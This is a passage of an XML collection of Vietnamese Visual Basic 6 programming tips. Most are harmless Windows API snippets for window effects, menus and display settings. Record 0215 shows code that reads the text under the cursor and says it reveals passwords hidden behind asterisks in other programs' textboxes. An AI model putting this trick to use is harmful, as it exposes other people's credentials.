Private Sub Text1_GotFocus() 
Text1.SelStart = Text2.SelStart 
End Sub 
Private Sub Text2_GotFocus() 
Text2.SelStart = Text1.SelStart 
End Sub

Bây giờ bạn hãy chạy thử chương trình và gõ vào vài dòng văn bản, sau đó chọn lệnh Wordwrap vài lần xem, úi cha, thật là tuyệt, chính bạn còn bị "lừa" nữa.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000199</MaVD>
    <NoiDung>Private Sub List1_MouseMove(Button As _ 
Integer, Shift As Integer, X As Single, Y As Single) 
Dim YPos As Integer, iOldFontSize As Integer 
iOldFontSize = Me.Font.Size 
Me.Font.Size = List1.Font.Size 
YPos = Y \ Me.TextHeight("Xyz") + List1.TopIndex 
Me.Font.Size = iOldFontSize 
If YPos &lt; List1.ListCount Then 
List1.ToolTipText = List1.List(YPos) 
Else 
List1.ToolTipText = " 
End If 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000200</MaVD>
    <NoiDung>Để minh họa tôi đã dùng một Timer (Timer1) và 2 Picture box (Picture1 và Picture2), Picture2 màu xanh nằm trong Picture1 màu xám. Cùng với đoạn mã sau: 

Option Explicit 
Private Sub Form_Load() 
Picture2.Width = 0 
Timer1.Interval = 1000 
End Sub 

Private Sub Timer1_Timer() 
If Picture2.Width &lt; Picture1.Width Then 
Picture2.Width = Picture2.Width + Picture1.Width \ 20 
Else 
Timer1.Interval = 0 
MsgBox "Đã 20 giây trôi qua rồi đấy!" 
End 
End If 
End Sub

Khi chạy thử chương trình bạn sẽ thấy Progress bar của chúng ta thay đổi mỗi giây 1 lần, cho đến hết 20 giây, thông báo bằng hàm MsgBox, nếu bạn click OK thì nó goodbye bạn luôn.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000201</MaVD>
    <NoiDung>Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hWnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Private Const GWL_EXSTYLE = (-20)
Private Const LWA_ALPHA = &amp;H2
Private Const WS_EX_LAYERED = &amp;H80000

Dim m_lAlpha

Private Sub Form_Load()
    Dim lStyle As Long
    lStyle = GetWindowLong(Me.hWnd, GWL_EXSTYLE)
    lStyle = lStyle Or WS_EX_LAYERED
    SetWindowLong Me.hWnd, GWL_EXSTYLE, lStyle
    SetLayeredWindowAttributes Me.hWnd, 0, 0, LWA_ALPHA
    Timer1.Interval = 100
    Timer2.Interval = 100
    Timer2.Enabled = False
    Timer1.Enabled = True
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    If UnloadMode &lt;&gt; vbFormCode Then
        Cancel = True
        Timer2.Enabled = True
    End If
End Sub

Private Sub Timer1_Timer()
    m_lAlpha = m_lAlpha + 15
    If (m_lAlpha &gt; 255) Then
        m_lAlpha = 255
        Timer1.Enabled = False
    Else
        SetLayeredWindowAttributes Me.hWnd, 0, m_lAlpha, LWA_ALPHA
    End If
End Sub

Private Sub Timer2_Timer()
    m_lAlpha = m_lAlpha - 15
    If (m_lAlpha &lt; 0) Then
        m_lAlpha = 0
        Unload Me
    Else
        SetLayeredWindowAttributes Me.hWnd, 0, m_lAlpha, LWA_ALPHA
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000202</MaVD>
    <NoiDung>Module code: 
Option Explicit 

Public Const SWP_DRAWFRAME As Long = &amp;H20 
Public Const SWP_NOMOVE As Long = &amp;H2 
Public Const SWP_NOSIZE As Long = &amp;H1 
Public Const SWP_NOZORDER As Long = &amp;H4 
Public Const SWP_FLAGS As Long = SWP_NOZORDER Or SWP_NOSIZE Or _ 
                                 SWP_NOMOVE Or SWP_DRAWFRAME 
Public Const GWL_STYLE As Long = (-16) 
Public Const WS_THICKFRAME As Long = &amp;H40000 

Public Declare Function GetWindowLong Lib "user32" _ 
     Alias "GetWindowLongA" _ 
    (ByVal hwnd As Long, _ 
     ByVal nIndex As Long) As Long 

Public Declare Function SetWindowLong Lib "user32" _ 
     Alias "SetWindowLongA" _ 
    (ByVal hwnd As Long, _ 
     ByVal nIndex As Long, _ 
     ByVal dwNewLong As Long) As Long 

Public Declare Function SetWindowPos Lib "user32" _ 
    (ByVal hwnd As Long, _ 
     ByVal hWndInsertAfter As Long, _ 
     ByVal X As Long, _ 
     ByVal Y As Long, _ 
     ByVal cx As Long, _ 
     ByVal cy As Long, _ 
     ByVal wFlags As Long) As Long

Thêm vào Form 1 TextBox, 2 CommandButton và 2 Label. 

Form code: 
Option Explicit 

Dim initBoxStyle As Long 
Dim initLeft As Integer 
Dim initTop As Integer 
Dim initWidth As Integer 
Dim initHeight As Integer 

Private Sub Command2_Click() 
   SetControlStyle initBoxStyle, Text1 
End Sub 

Private Sub Form_Load() 
   initBoxStyle = GetWindowLong(Text1.hwnd, GWL_STYLE) 
   initLeft = Text1.Left 
   initTop = Text1.Top 
   initWidth = Text1.Width 
   initHeight = Text1.Height 

   SetControlStyle initBoxStyle, Text1 
  
   Label1.Caption = "Text Width : " &amp; Text1.Width 
   Label2.Caption = "Text Height: " &amp; Text1.Height 
   Command1.Caption = "Resize" 
   Command2.Caption = "Restore" 
End Sub 

Private Sub Form_Unload(Cancel As Integer) 
   SetControlStyle initBoxStyle, Text1 
End Sub 

Private Sub Form_Click() 
   SetControlStyle initBoxStyle, Text1 
  
   Label1.Caption = "Text Width : " &amp; Text1.Width 
   Label2.Caption = "Text Height: " &amp; Text1.Height 
End Sub 

Private Sub Command1_Click() 
    
   Dim style As Long 
  
   style = GetWindowLong(Text1.hwnd, GWL_STYLE) 
  
   style = style Or WS_THICKFRAME 

   SetControlStyle style, Text1 

End Sub 

Private Sub SetControlStyle(style, X As Control)
   If style Then 
       Call SetWindowLong(X.hwnd, GWL_STYLE, style) 
       Call SetWindowPos(X.hwnd, Form1.hwnd, 0, 0, 0, 0,  SWP_FLAGS) 
  End If 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000203</MaVD>
    <NoiDung>Option Explicit
   Dim ID As Integer
   Dim It1 As String
   Dim It2 As String
   Dim YIndex As Integer

Private Sub Form_Load()
    Dim i As Byte
    For i = 1 To 20
        lstShow.AddItem "Cau Lac Bo VB" &amp; i
        lstHide.AddItem "Cau Lac Bo VB" &amp; i
    Next i
End Sub

Private Sub lstShow_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
   If Button = vbLeftButton Then
      If YIndex &gt; Y + (Me.TextHeight("XYZ")) Or YIndex &lt; Y - (Me.TextHeight("XYZ")) Then
         lstShow.MousePointer = 99
      End If
   End If
End Sub

Private Sub lstShow_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
   If Button = vbLeftButton Then
      YIndex = Y
                ID = lstShow.ListIndex
      It1 = lstShow.List(ID)
      It2 = lstHide.List(ID)
   End If
End Sub

Private Sub lstShow_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbLeftButton Then
       If YIndex &gt; Y + (Me.TextHeight("XYZ")) Or YIndex &lt; Y - (Me.TextHeight("XYZ")) Then
          lstShow.List(ID) = lstShow.List(lstShow.ListIndex)
          lstHide.List(ID) = lstHide.List(lstShow.ListIndex)
          lstShow.List(lstShow.ListIndex) = It1
          lstHide.List(lstShow.ListIndex) = It2
       End If
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000205</MaVD>
    <NoiDung>‘Hãy tạo 1 Menu cho Form rồi copy đoạn code này vào:
Private Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ModifyMenu Lib "user32" Alias "ModifyMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpString As Any) As Long
Private Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Private Const MF_BYPOSITION = &amp;H400&amp;
Private Const MF_HELP = &amp;H4000&amp;
Private Sub Form_Load()
    res = GetMenu(Me.hwnd)
    ModifyMenu res, 1, MF_BYPOSITION Or MF_HELP, 1, "Menu2"
    DrawMenuBar Me.hwnd
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000207</MaVD>
    <NoiDung>Option Explicit

Private Type FLASHWINFO
cbSize As Long
Hwnd As Long
dwFlags As Long
uCount As Long
dwTimeout As Long
End Type

Private Const FLASHW_TRAY = 2
Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Private Declare Function FlashWindowEx Lib "user32" (FWInfo As FLASHWINFO) As Boolean

Public Sub FlashWindow(Hwnd As Long, Optional NumberOfFlashes As Integer = 10)
    If Not APIFunctionPresent("FlashWindowEx", "user32") Then Exit Sub
    Dim bRet As Boolean
    Dim udtFWInfo As FLASHWINFO
    With udtFWInfo
        .cbSize = 20
        .Hwnd = Hwnd
        .dwFlags = FLASHW_TRAY
        .uCount = NumberOfFlashes
        .dwTimeout = 0
    End With
    bRet = FlashWindowEx(udtFWInfo)
End Sub

Private Function APIFunctionPresent(ByVal FunctionName As String, ByVal DllName As String) As Boolean
    Dim lHandle As Long
    Dim lAddr As Long
    lHandle = LoadLibrary(DllName)
    If lHandle &lt;&gt; 0 Then
        lAddr = GetProcAddress(lHandle, FunctionName)
        FreeLibrary lHandle
    End If
    APIFunctionPresent = (lAddr &lt;&gt; 0)
End Function

Private Sub Form_Load()
    FlashWindow Me.Hwnd
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000208</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim i As Integer
    For i = 0 To Form1.Controls.Count - 1
        Form1.Controls(i).Enabled = False
    Next i
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000209</MaVD>
    <NoiDung>Const SW_HIDE = 0
Const SW_NORMAL = 1
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Dim tWnd As Long, bWnd As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Get the taskbar's window handle
    tWnd = FindWindow("Shell_TrayWnd", vbNullString)
    'Hide the TaskBar
    'ShowWindow tWnd, SW_HIDE
    
    'Get the start-button's window handle
    bWnd = FindWindowEx(tWnd, ByVal 0&amp;, "BUTTON", vbNullString)
    'Hide the start button
    ShowWindow bWnd, SW_HIDE
End Sub
Private Sub Form_Unload(Cancel As Integer)
    'show the start button
    ShowWindow bWnd, SW_NORMAL
    
    'Hide the TaskBar
    ShowWindow tWnd, SW_NORMAL
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000210</MaVD>
    <NoiDung>Hãy tạo 1 form mới trên đó tạo một control nào đó ví dụ như CommandButton, kế đến bạn hãy tạo 1 Combo box. Lý do bạn phải tạo Command button trước để cho nó có focus trước (TabIndex = 0), khi chạy chương trình bạn hãy nhấn phím Tab để chuyển focus sang cho combo box, lúc này bạn sẽ thấy rất rõ tác dụng của lệnh SendKeys.

Private Sub Combo1_GotFocus() 
   SendKeys "%{DOWN}" 
End Sub

Câu lệnh SendKeys "%{DOWN}" dùng để gởi tổ hợp phím ALT - DownArrow lên Combo box khi chính nó nhận được Focus do người sử dụng dịch chuyển bằng phím Tab hay bằng Mouse. Sẽ làm cho combo box tự động mở ra (hiện danh sách). 

Thủ thuật này hữu ích khi bạn viết các ứng dụng có yêu cầu nhập dữ liệu, thường thì người dùng nhập dữ liệu bằng bàn phím, sau đó nhấn phím Tab đến một combo box, nó sẽ bung ra ngay để người dùng chọn lựa, rất tiện dụng, khiến cho người ta cảm thấy rất hài lòng về chương trình của mình.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000211</MaVD>
    <NoiDung>Public Sub addMultiFileSub() 
‘C = CommonDialog 
‘List1 = ListBox 

     C.Flags = cdlOFNExplorer + cdlOFNAllowMultiselect 
     C.Filter = "Multimedia files (*.mp3;*.wav;*.mid)|*.mp3;*.wav;*.mid|All Files (*.*)|*.*" 
     C.MaxFileSize = 10000             'Kích thước bộ nhớ lưu số lượng bài hát 
     C.ShowOpen 
      
     If C.Filename = " Then Exit Sub 
    
     Dim a As Variant 
     Dim P As Integer 
    
     a = Split(C.Filename, vbNullChar) 
     If UBound(a) = 0 Then 
          List1.AddItem C.Filename 
     Else 
          For P = 1 To UBound(a) 
               If Right(a(0), 1) &lt;&gt; "\" Then a(0) = a(0) &amp; "\" 
               List1.AddItem a(0) + a(P) 
          Next 
     End If 
      
     C.Filename = " 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000212</MaVD>
    <NoiDung>Bạn có thể kiểm tra thông tin về độ phân giải màn hình bằng đoạn lệnh sau: 

Debug.Print "Height: " &amp; SysInfo1.WorkAreaHeight 
Debug.Print "Width: " &amp; SysInfo1.WorkAreaWidth 
Debug.Print "Top: " &amp; SysInfo1.WorkAreaTop 
Debug.Print "Left: " &amp; SysInfo1.WorkAreaLeft 

Để nhận biết và phản ứng khi độ phân giải màn hình thay đổi, hãy thêm lệnh vào sự kiện DisplayChanged. Ví dụ như đoạn mã sau thay đổi kích thước form để phủ kín toàn màn hình: 

Private Sub SysInfo1_DisplayChanged() 
    Me.Move SysInfo1.WorkAreaLeft, SysInfo1.WorkAreaTop, _ 
    SysInfo1.WorkAreaWidth, SysInfo1.WorkAreaHeight 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000213</MaVD>
    <NoiDung>Dim F as String
F = Dir1.path &amp; IIF(Len(Dir1.path)=3,","\") &amp; File1.FileName

Hay

If Len(Dir1=3) then
    F = Dir1.path &amp; File1.FileName
else
    F = Dir1.path &amp; "\" &amp; File1.FileName
End If

Hoặc dùng hàm:

Function BackSlash(FilePath As String) As String
 If Right$(FilePath, 1) &lt;&gt; "\" Then FilePath = FilePath + "\"
 BackSlash = FilePath
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000214</MaVD>
    <NoiDung>‘Khai báo các hằng số cần thiết 
Const HWND_TOPMOST = -1 
Const HWND_NOTOPMOST = -2 
Const SWP_NOSIZE = &amp;H1 
Const SWP_NOMOVE = &amp;H2 
Const SWP_NOACTIVATE = &amp;H10 
Const SWP_SHOWWINDOW = &amp;H40 

‘Hàm API cần sử dụng 
Private Declare Sub SetWindowPos Lib "User32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) 

Private Sub Command1_Click() 
       'Đặt cửa sổ lên vị trí trên cùng
    SetWindowPos Me.hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOACTIVATE Or SWP_SHOWWINDOW Or SWP_NOMOVE Or SWP_NOSIZE 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000215</MaVD>
    <NoiDung>Private Const WM_GETTEXT = &amp;HD 
Private Const WM_GETTEXTLENGTH = &amp;HE 

Private Type POINTAPI 
    X As Long 
    Y As Long 
End Type 

Private Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long 
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long 
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long 

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single) 
    Dim Pt As POINTAPI, mWnd As Long 
    'Get the current cursor position 
    GetCursorPos Pt 
    'Get the window under the cursor 
    mWnd = WindowFromPoint(Pt.X, Pt.Y) 
    
    Dim length As Long 
    Dim result As Long 
    Dim strtmp As String 
    
    length = SendMessage(mWnd, WM_GETTEXTLENGTH, ByVal 0, ByVal 0) + 1 
    strtmp = Space(length) 
    result = SendMessage(mWnd, WM_GETTEXT, ByVal length, ByVal strtmp) 
    Me.Print strtmp 

End Sub 

Private Sub Form_Paint() 
    Me.CurrentX = 0 
    Me.CurrentY = 0 
    Me.Print "Click on this form," + vbCrLf + "Hold the mouse button," + vbCrLf + "drag the mouse over another window," + vbCrLf + "release the mouse button" + vbCrLf + "and see what happens!" 
End Sub 

Bây giờ hãy click chuột lên Form, giữ nguyên như vậy và di chuyển chuột tới cái Textbox nào chứa các dấu *, bạn sẽ thấy được password của nó. Chúc bạn thành công!!!</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000216</MaVD>
    <NoiDung>Ví dụ bên dưới dùng PostMessage để đóng 1 ứng dụng đang chạy (ở đây là chương trình Calculator) 

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long 
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long 
Const WM_CLOSE = &amp;H10 

Private Sub Form_Load() 

Dim winHwnd As Long 
Dim RetVal As Long    
    'Tìm lấy handle của cửa sổ 
    winHwnd = FindWindow(vbNullString, "Calculator") 
    If winHwnd &lt;&gt; 0 Then   'Nếu tìm thấy thì 
        'Đóng nó lại 
        PostMessage winHwnd, WM_CLOSE, 0&amp;, 0&amp; 
    Else 
        MsgBox "The Calculator is not open." 
    End If 

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000218</MaVD>
    <NoiDung>1. Select Shortcut VB6 (Thường là Start &gt;Programs &gt;Microsoft Visual Studio 6.0 &gt; Microsoft Visual Basic 6.0) nhấn chuột phải chọn properties 
2. Trong Start in " Gõ địa chỉ thư mục mặc định khi lưu vào đây. Eg: D:\Project\VB" 
3. Nhấn Apply or OK 

Bây giờ các anh thử xem, đã hiệu quả chưa nào? Thật là tiện phải không ?</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000220</MaVD>
    <NoiDung>'Thêm vào form 2 button
Option Explicit

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Const WM_SYSCOMMAND = &amp;H112
Private Const SC_MONITORPOWER = &amp;HF170&amp;
Private Const MONITOR_ON = -1&amp;
Private Const MONITOR_LOWPOWER = 1&amp;
Private Const MONITOR_OFF = 2&amp;

Public Sub MonitorPower_Off(ByVal frm As Object)
    SendMessage frm.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal MONITOR_OFF
End Sub

Public Sub MonitorPower_On(ByVal frm As Object)
    SendMessage frm.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal MONITOR_ON
End Sub

Private Sub Command1_Click()
    MonitorPower_Off Me
End Sub

Private Sub Command2_Click()
    MonitorPower_On Me
End Sub

Private Sub Form_Load()
    Command1.Caption = "Tat man hinh"
    Command2.Caption = "Bat man hinh"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000221</MaVD>
    <NoiDung>Module code: 

Public Const LF_FACESIZE = 32 

Public Type LOGFONT '60 byte 
    lfHeight As Long 
    lfWidth As Long 
    lfEscapement As Long 
    lfOrientation As Long 
    lfWeight As Long 
    lfItalic As Byte 
    lfUnderline As Byte 
    lfStrikeOut As Byte 
    lfCharSet As Byte 
    lfOutPrecision As Byte 
    lfClipPrecision As Byte 
    lfQuality As Byte 
    lfPitchAndFamily As Byte 
    lfFaceName(LF_FACESIZE) As Byte 
End Type 

Public Type NMLOGFONT '56 byte 
    lfHeight As Long 
    lfWidth As Long 
    lfEscapement As Long 
    lfOrientation As Long 
    lfWeight As Long 
    lfItalic As Byte 
    lfUnderline As Byte 
    lfStrikeOut As Byte 
    lfCharSet As Byte 
    lfOutPrecision As Byte 
    lfClipPrecision As Byte 
    lfQuality As Byte 
    lfPitchAndFamily As Byte 
    lfFaceName(LF_FACESIZE - 4) As Byte 
End Type 

Public Type NONCLIENTMETRICS 
    cbSize As Long 
    iBorderWidth As Long 
    iScrollWidth As Long 
    iScrollHeight As Long 
    iCaptionWidth As Long 
    iCaptionHeight As Long 
    lfCaptionFont As NMLOGFONT 
    iSMCaptionWidth As Long 
    iSMCaptionHeight As Long 
    lfSMCaptionFont As NMLOGFONT 
    iMenuWidth As Long 
    iMenuHeight As Long 
    lfMenuFont As NMLOGFONT 
    lfStatusFont As NMLOGFONT 
    lfMessageFont As NMLOGFONT 
End Type 

Public Const REG_STRUCTURESIZE = 340 'Size of NONCLIENTMETRICS 
Public Const SPI_SETNONCLIENTMETRICS = 42 
Public Const SPI_GETNONCLIENTMETRICS = 41 

Public Declare Function SystemParametersInfo Lib "user32" _ 
        Alias "SystemParametersInfoA" (ByVal uAction As Long, _ 
        ByVal uParam As Long, lpvParam As Any, _ 
        ByVal fuWinIni As Long) As Long 

Public newFontMetric As NONCLIENTMETRICS 
Public oldFontMetric As NONCLIENTMETRICS 

Public Sub ConvertFontToByte(ByRef lfFont As NMLOGFONT, ByRef fFontName As String) 
    
    Dim i As Byte 
        
    For i = 1 To Len(fFontName) 
        lfFont.lfFaceName(i - 1) = Asc(Mid(fFontName, i, 1)) 
    Next 
    
    For i = Len(fFontName) To (LF_FACESIZE - 4) 
        lfFont.lfFaceName(i) = 0 
    Next 
    
End Sub 

Public Sub SetFont(ByVal newFontName As String) 
    
    newFontName = IIf(IsNull(newFontName), "VK Sans Serif", newFontName) 
    
    Dim VarGT As Long 
    oldFontMetric.cbSize = REG_STRUCTURESIZE 
    VarGT = SystemParametersInfo(SPI_GETNONCLIENTMETRICS, REG_STRUCTURESIZE, oldFontMetric, 0) 
    
    newFontMetric.cbSize = REG_STRUCTURESIZE 
    newFontMetric.iCaptionWidth = 30 
    newFontMetric.lfCaptionFont.lfHeight = -13 
    newFontMetric.lfCaptionFont.lfWeight = 700 
    
    Call ConvertFontToByte(newFontMetric.lfCaptionFont, newFontName) 
    Call ConvertFontToByte(newFontMetric.lfMenuFont, newFontName) 
    Call ConvertFontToByte(newFontMetric.lfMessageFont, newFontName) 
    Call ConvertFontToByte(newFontMetric.lfSMCaptionFont, newFontName) 
    Call ConvertFontToByte(newFontMetric.lfStatusFont, newFontName) 
    
    VarGT = SystemParametersInfo(SPI_SETNONCLIENTMETRICS, REG_STRUCTURESIZE, newFontMetric, 0) 
    
End Sub 

Public Sub RestoreFont() 
    Dim VarGT As Long 
    oldFontMetric.cbSize = REG_STRUCTURESIZE 
    VarGT = SystemParametersInfo(SPI_SETNONCLIENTMETRICS, REG_STRUCTURESIZE, oldFontMetric, 0) 
End Sub 


Form code: 

Private Sub Form_Load() 
    Call SetFont("VK Sans Serif") 
End Sub 

Private Sub Form_Unload(Cancel As Integer) 
    Call RestoreFont 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000222</MaVD>
    <NoiDung>Private Sub Command1_Click() 
    fname = "c:\pcname.reg" 
    str2 = Chr(34) &amp; "ComputerName" &amp; Chr(34) &amp; "=" 
    
    Shell "regedit.exe /e " &amp; fname &amp; " HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" 
    
    Open fname For Input As #1 
    Do While Not EOF(1) 
        Line Input #1, str1 
        i = InStr(1, str1, str2) 
        If i &gt; 0 Then MsgBox str1 
    Loop 
    Close #1 
    Kill fname 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000224</MaVD>
    <NoiDung>'Module code: 
Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long 

Public Const COLOR_SCROLLBAR = 0 'The Scrollbar color 
Public Const COLOR_BACKGROUND = 1 'Colour of the background with no wallpaper 
Public Const COLOR_ACTIVECAPTION = 2 'Caption of Active Window 
Public Const COLOR_INACTIVECAPTION = 3 'Caption of Inactive window 
Public Const COLOR_MENU = 4 'Menu 
Public Const COLOR_WINDOW = 5 'Windows background 
Public Const COLOR_WINDOWFRAME = 6 'Window frame 
Public Const COLOR_MENUTEXT = 7 'Window Text 
Public Const COLOR_WINDOWTEXT = 8 '3D dark shadow (Win95) 
Public Const COLOR_CAPTIONTEXT = 9 'Text in window caption 
Public Const COLOR_ACTIVEBORDER = 10 'Border of active window 
Public Const COLOR_INACTIVEBORDER = 11 'Border of inactive window 
Public Const COLOR_APPWORKSPACE = 12 'Background of MDI desktop 
Public Const COLOR_HIGHLIGHT = 13 'Selected item background 
Public Const COLOR_HIGHLIGHTTEXT = 14 'Selected menu item 
Public Const COLOR_BTNFACE = 15 'Button 
Public Const COLOR_BTNSHADOW = 16 '3D shading of button 
Public Const COLOR_GRAYTEXT = 17 'Grey text, of zero if dithering is used. 
Public Const COLOR_BTNTEXT = 18 'Button text 
Public Const COLOR_INACTIVECAPTIONTEXT = 19 'Text of inactive window 
Public Const COLOR_BTNHIGHLIGHT = 20 '3D highlight of button 

'Form code: 
Private Sub Command1_Click() 
    'set active forms title bar to red 
    Dim lngReturn As Long 
    lngReturn = SetSysColors(1, COLOR_ACTIVECAPTION, RGB(255, 0, 0)) 
    'lngReturn = SetSysColors(1, COLOR_CAPTIONTEXT, RGB(255, 0, 0)) 
    '.........Bạn thay thế các hằng số trên vào để sử dụng cho phù hợp......... 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000225</MaVD>
    <NoiDung>'Thêm vào Form 1 combobox
Private Sub Form_Load()
    For i = 0 To Screen.FontCount - 1
        Combo1.AddItem Screen.Fonts(i)
    Next i
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000226</MaVD>
    <NoiDung>Option Explicit
Const WM_DISPLAYCHANGE = &amp;H7E
Const HWND_BROADCAST = &amp;HFFFF&amp;
Const EWX_LOGOFF = 0
Const EWX_SHUTDOWN = 1
Const EWX_REBOOT = 2
Const EWX_FORCE = 4
Const CCDEVICENAME = 32
Const CCFORMNAME = 32
Const DM_BITSPERPEL = &amp;H40000
Const DM_PELSWIDTH = &amp;H80000
Const DM_PELSHEIGHT = &amp;H100000
Const CDS_UPDATEREGISTRY = &amp;H1
Const CDS_TEST = &amp;H4
Const DISP_CHANGE_SUCCESSFUL = 0
Const DISP_CHANGE_RESTART = 1
Const BITSPIXEL = 12
Private Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer
    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer
    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type
Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
Private Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwFlags As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetDeviceCaps Lib "gdi32" (ByVal hdc As Long, ByVal nIndex As Long) As Long
Private Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, ByVal lpInitData As Any) As Long
Private Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Dim OldX As Long, OldY As Long, nDC As Long
Sub ChangeRes(X As Long, Y As Long, Bits As Long)
    Dim DevM As DEVMODE, ScInfo As Long, erg As Long, an As VbMsgBoxResult
    'Get the info into DevM
    erg = EnumDisplaySettings(0&amp;, 0&amp;, DevM)
    'This is what we're going to change
    DevM.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT Or DM_BITSPERPEL
    DevM.dmPelsWidth = X 'ScreenWidth
    DevM.dmPelsHeight = Y 'ScreenHeight
    DevM.dmBitsPerPel = Bits '(can be 8, 16, 24, 32 or even 4)
    'Now change the display and check if possible
    erg = ChangeDisplaySettings(DevM, CDS_TEST)
    'Check if succesfull
    Select Case erg&amp;
        Case DISP_CHANGE_RESTART
            an = MsgBox("You've to reboot", vbYesNo + vbSystemModal, "Info")
            If an = vbYes Then
                erg&amp; = ExitWindowsEx(EWX_REBOOT, 0&amp;)
            End If
        Case DISP_CHANGE_SUCCESSFUL
